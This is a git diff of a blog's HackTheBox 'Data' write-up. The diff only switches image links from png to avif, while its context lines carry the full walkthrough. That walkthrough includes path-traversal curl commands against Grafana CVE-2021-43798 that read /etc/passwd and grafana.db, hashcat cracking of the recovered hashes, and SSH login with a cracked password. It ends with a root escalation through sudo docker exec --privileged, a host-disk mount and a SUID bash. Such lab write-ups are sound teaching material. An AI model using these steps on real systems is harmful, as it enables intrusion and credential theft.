@@ -17,7 +17,7 @@ title: 'HTB Write up Data'
 ---
 # [HackTheBox - Data](https://app.hackthebox.com/machines/Data)
 
-![d00a1fb57b96b9ced6d6ec46f6694f42.png](/assets/resources-writeups/d00a1fb57b96b9ced6d6ec46f6694f42.png)
+![d00a1fb57b96b9ced6d6ec46f6694f42.png](/assets/resources-writeups/d00a1fb57b96b9ced6d6ec46f6694f42.avif)
 
 ## Table of Contents
 
@@ -40,39 +40,39 @@ To become root, I utilized privileged mode of docker to mount host filesystem to
 
 I start my initial nmap scanning with `-sCV` flag right away since I don't expect much port to be running on Linux box which reveals SSH running on port 22 and Grafana running on port 3000.
 
-![0d804c1fb1d24482267731816e7f2d3b.png](/assets/resources-writeups/0d804c1fb1d24482267731816e7f2d3b.png)
+![0d804c1fb1d24482267731816e7f2d3b.png](/assets/resources-writeups/0d804c1fb1d24482267731816e7f2d3b.avif)
 
 I open the Grafana webpage right away which reveals redirect me to the login page and on this page, I notice the version of this Grafana instance right away.
 
-![f5a25d82fd6c63db1048d917c5746a39.png](/assets/resources-writeups/f5a25d82fd6c63db1048d917c5746a39.png)
+![f5a25d82fd6c63db1048d917c5746a39.png](/assets/resources-writeups/f5a25d82fd6c63db1048d917c5746a39.avif)
 
 ## Initial Access via Grafana CVE-2021-43798
 
 Doing quick google search reveals that this version is fairly old and have several CVEs that can be leveraged like CVE-2021-43798 for arbitrary file read/Directory traversal.
 
-![f115b28a7a6b852e866e2097142e128f.png](/assets/resources-writeups/f115b28a7a6b852e866e2097142e128f.png)
+![f115b28a7a6b852e866e2097142e128f.png](/assets/resources-writeups/f115b28a7a6b852e866e2097142e128f.avif)
 
 CVE-2021-43798 allow unauthenticated user to access local files by specify the path of Grafana pre-installed plugin, PoC of this vulnerability could be found [here](https://www.exploit-db.com/exploits/50581) 
 
-![8c1e244e213f55b4519807e2f4229552.png](/assets/resources-writeups/8c1e244e213f55b4519807e2f4229552.png)
+![8c1e244e213f55b4519807e2f4229552.png](/assets/resources-writeups/8c1e244e213f55b4519807e2f4229552.avif)
 
 Knowing how this vulnerability works, I use curl to read `/etc/passwd` which reveals that It is still vulnerable but one thing to notice here is no existence of user with uid=1000 and that make me believe that this Grafana is running on the docker instance.
 
 ```
 curl --path-as-is 'http://data.vl:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/passwd'
 ```
-![dc5f9ace779b98a013bd6b2b0fc8bb9f.png](/assets/resources-writeups/dc5f9ace779b98a013bd6b2b0fc8bb9f.png)
+![dc5f9ace779b98a013bd6b2b0fc8bb9f.png](/assets/resources-writeups/dc5f9ace779b98a013bd6b2b0fc8bb9f.avif)
 
 Next question is how to leverage this vulnerability to gain a foothold? From this [PoC](https://github.com/jas502n/Grafana-CVE-2021-43798), I've found that Grafana have the database file that might contain the password hash of user and I can decrypt it to find if there is a password that can be used to get foothold on the host via SSH.
 
-![5788215d0b508e62c22a8e4e3aad632d.png](/assets/resources-writeups/5788215d0b508e62c22a8e4e3aad632d.png)
+![5788215d0b508e62c22a8e4e3aad632d.png](/assets/resources-writeups/5788215d0b508e62c22a8e4e3aad632d.avif)
 
 First, I retrieve the database file using curl like this.
 
 ```
 curl --path-as-is 'http://data.vl:3000/public/plugins/welcome/../../../../../../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
 ```
-![48e7d6f38f968ac545a9dce8a47f843c.png](/assets/resources-writeups/48e7d6f38f968ac545a9dce8a47f843c.png)
+![48e7d6f38f968ac545a9dce8a47f843c.png](/assets/resources-writeups/48e7d6f38f968ac545a9dce8a47f843c.avif)
 
 Then I open the database file with sqlite3 and query the user table which reveals that there is another user credential on this host and I will need to crack the password hash to get the password of this user.
 
@@ -80,7 +80,7 @@ Then I open the database file with sqlite3 and query the user table which reveal
 sqlite3 grafana.db
 select * from user;
 ```
-![e42782f89a6391bbb68ba5af019d6ac4.png](/assets/resources-writeups/e42782f89a6391bbb68ba5af019d6ac4.png)
+![e42782f89a6391bbb68ba5af019d6ac4.png](/assets/resources-writeups/e42782f89a6391bbb68ba5af019d6ac4.avif)
 
 There is a [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat) script that can be used to format the hash and salt to crackable hash with hashcat so I download the script and prepare the text file with hash and salt of both users found in the database to "hash,salt" format and now my text file look like this
 
@@ -94,28 +94,28 @@ Then I use the script to get crackable hash.
 ```
 python grafana2hashcat.py grafana_hash_salt
 ```
-![ec47056e540cb85b6a5d1c0aba0fa319.png](/assets/resources-writeups/ec47056e540cb85b6a5d1c0aba0fa319.png)
+![ec47056e540cb85b6a5d1c0aba0fa319.png](/assets/resources-writeups/ec47056e540cb85b6a5d1c0aba0fa319.avif)
 
 After using hashcat to crack the hash, I obtain 1 password as shown in the image below.
 
 ```
 hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt
 ```
-![69ec482c0e3f8991081f10e936b3f437.png](/assets/resources-writeups/69ec482c0e3f8991081f10e936b3f437.png)
+![69ec482c0e3f8991081f10e936b3f437.png](/assets/resources-writeups/69ec482c0e3f8991081f10e936b3f437.avif)
 
 I utilize NetExec to validate this credential with SSH and the result confirm that I can use this credential to get foothold on the box.
 
 ```
 uv run nxc ssh data.vl -u boris -p beautiful1 
 ```
-![02b33454380f6270108e68cf8bceed30.png](/assets/resources-writeups/02b33454380f6270108e68cf8bceed30.png)
+![02b33454380f6270108e68cf8bceed30.png](/assets/resources-writeups/02b33454380f6270108e68cf8bceed30.avif)
 
 The user flag located on the home folder of boris user as I obtain my foothold via this user.
 
 ```
 sshpass -p beautiful1 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" boris@data.vl
 ```
-![ba4c9370421ed9865dd52dda102d50e7.png](/assets/resources-writeups/ba4c9370421ed9865dd52dda102d50e7.png)
+![ba4c9370421ed9865dd52dda102d50e7.png](/assets/resources-writeups/ba4c9370421ed9865dd52dda102d50e7.avif)
 
 ## Privilege Escalation via SUDO docker exec with privileged flag
 
@@ -124,32 +124,32 @@ After gaining foothold, I check if this user can run any command as root or othe
 ```
 sudo -l
 ```
-![68bd63d9757f192428c2997e465d7e85.png](/assets/resources-writeups/68bd63d9757f192428c2997e465d7e85.png)
+![68bd63d9757f192428c2997e465d7e85.png](/assets/resources-writeups/68bd63d9757f192428c2997e465d7e85.avif)
 
 To be able to use `docker exec`, I need to confirm the docker container that is running on this box which I know that there must be one container that is running Grafana and now I have the docker container ID to work with.
 
 ```
 ps aux | grep docker
 ```
-![58bf9e17c915debc324cc900ad65b941.png](/assets/resources-writeups/58bf9e17c915debc324cc900ad65b941.png)
+![58bf9e17c915debc324cc900ad65b941.png](/assets/resources-writeups/58bf9e17c915debc324cc900ad65b941.avif)
 
 One of the most dangerous flags used when running a Docker container with `docker exec` is `--privileged`. This flag gives the container direct access to the host kernel and allows it to run with all capabilities, so by running containers with this flag and will allow me to mount the host filesystem and I will use `/dev/sda1` which is mounted to root directory to mount to it inside the docker image as well. 
 
-![99de0a9127b07b6458c4b6f3d2d059ce.png](/assets/resources-writeups/99de0a9127b07b6458c4b6f3d2d059ce.png)
+![99de0a9127b07b6458c4b6f3d2d059ce.png](/assets/resources-writeups/99de0a9127b07b6458c4b6f3d2d059ce.avif)
 
 Now I'll run docker exec (via sudo) to open an interactive root shell (bash) inside the running container and as expected that this instance is really the one that host Grafana.
 
 ```
 sudo /snap/bin/docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
 ```
-![957a1e58ee8937d55b65d819f6832a63.png](/assets/resources-writeups/957a1e58ee8937d55b65d819f6832a63.png)
+![957a1e58ee8937d55b65d819f6832a63.png](/assets/resources-writeups/957a1e58ee8937d55b65d819f6832a63.avif)
 
 Time it is the time to mount the host filesystem inside the docker container and I can already see that I can read the root flag with from the docker container right away.
 
 ```
 mount /dev/sda1 /mnt
 ```
-![7182a4e2561ad430db2953c1307edd31.png](/assets/resources-writeups/7182a4e2561ad430db2953c1307edd31.png)
+![7182a4e2561ad430db2953c1307edd31.png](/assets/resources-writeups/7182a4e2561ad430db2953c1307edd31.avif)
 
 I'm not satisfied with that so I set UID of the root to bash binary and now I will have effective user ID as root when running on the host as well which then concluded this box as I rooted it.
 
@@ -159,8 +159,8 @@ chmod u+s /mnt/tmp/bash
 exit
 /tmp/bash -p
 ```
-![b182c5270283fd0b362215be597c3881.png](/assets/resources-writeups/b182c5270283fd0b362215be597c3881.png)
+![b182c5270283fd0b362215be597c3881.png](/assets/resources-writeups/b182c5270283fd0b362215be597c3881.avif)
 
-![51b0d92ef1af169ac4d8955a1b498771.png](/assets/resources-writeups/51b0d92ef1af169ac4d8955a1b498771.png)
+![51b0d92ef1af169ac4d8955a1b498771.png](/assets/resources-writeups/51b0d92ef1af169ac4d8955a1b498771.avif)
 https://labs.hackthebox.com/achievement/machine/1438364/673
 ***
